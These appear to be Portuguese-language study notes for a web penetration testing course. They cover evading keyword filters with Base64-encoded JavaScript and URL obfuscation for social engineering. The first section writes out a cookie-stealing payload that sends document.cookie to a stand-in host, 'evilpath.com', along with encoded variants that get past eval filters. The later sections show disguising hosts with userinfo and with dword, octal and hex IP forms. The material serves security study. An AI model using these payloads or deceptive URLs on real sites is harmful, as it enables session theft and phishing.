# Base64 Encoding Evasion

A maioria dos sistemas de detecção utilizam o regex para encontrar palavras maliciosas. Imaginando que quero evadir de um sistema que procura pelas palavras: eval, alert, prompt, document.cookie

Normalmente se usa:
```JavaScript
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
```

Ele não vai funcionar por causa do "document.cookie", uma alternativa seria:
```JavaScript
eval(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))
```

Para esse exemplo também não vai funcionar por causa do "eval", outra possibilidade seria:
```JavaScript
[].constructor.constructor(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))()
```

Outros métodos válidos:
```JavaScript
setTimeout("code")    # Todos os navegadores
setInterval("code")   # Todos os navegadores
setImmediate("code")  # IE 10+
Function("code")()    # Todos os navegadores
```
# URI Obfuscation Techiques

Utilizado principalmente para engenharia social, mas também pode ser usado em alguma situação que seja necessário ocultar a url, dar bypass em algum sistema ou diminuir o tamanho do payload
## URL Shortening

Utilizado para encurtar a url, pode-se usar soluções prontas ou criar a sua própria solução

https://yourls.org/  -> Solução Open Source <br>
https://bitly.com/   -> Solução paga

*colocando um '+' ao fim da url encurtada pelo bitly, é possível descobrir mais informações sobre o verdadeiro link*

Outra forma de descobrir o link verdadeiro é realizando um cURL e analisando o header "Location" na resposta
## URL Hostname Obfuscation

Referência para estudo \[RFC 3986]: https://datatracker.ietf.org/doc/html/rfc3986#page-16
### URL Authority Obfuscation

**Obfuscating with Userinfo**

Estrutura da URI segundo a rfc:
```
foo://example.com:8042/over/there?name=ferret#nose
\_/ \________________/\_________/ \_________/ \__/
 |           |             |           |       |
scheme   authority        path       query  fragment
```

O componente Authority pode ter a seguinte estrutura:
```
[ userinfo "@" ] host [ ":" port ]
```

O campo "userinfo" é usado para autenticação em aplicações, seguindo esse exemplo:
```
http://user:pass@o-site-para-autenticar.com.br
```

Quando o site não possui autenticação esse campo é ignorado. Isso permite usar esse campo para ofuscar informações, criando urls como a seguinte:
```
http://www.google.com@hack.me/xss
```

É possível usar caracteres unicode para deixar a url ainda mais convincente

![](https://github.com/SQU4NCH/eWPTX-Study-Notes/blob/main/Imagens/Pasted%20image%2020231226160208.png)

*Navegadores como o Firefox e o Opera, avisam o usuário final do redirecionamento. Já o Chrome não avisa nada*

**Obfuscating with Host**

Um site pode ser acessado tanto por seu endereço DNS como por seu endereço IP, e esse endereço IP pode estar em diferentes formatos, como por exemplo, Dword, Hexadecimal, Octal

Como exemplo, o Google pode ser acessado usando os seguintes endereços:
```
http://google.com
http://216.58.215.78           # IP
http://3627734862              # DWORD
http://0330.0072.0327.0116     # OCTAL
http://0xd83ad74e              # HEXADECIMAL
http://0xd8.0x3a.0xd7.0x4e     # HEXADECIMAL (separado por número)
```

Também é possível criar um endereço híbrido, mesclando dois ou mais formatos

Ferramenta para ajudar na conversão de formatos:

https://www.silisoftware.com/tools/ipconverter.php
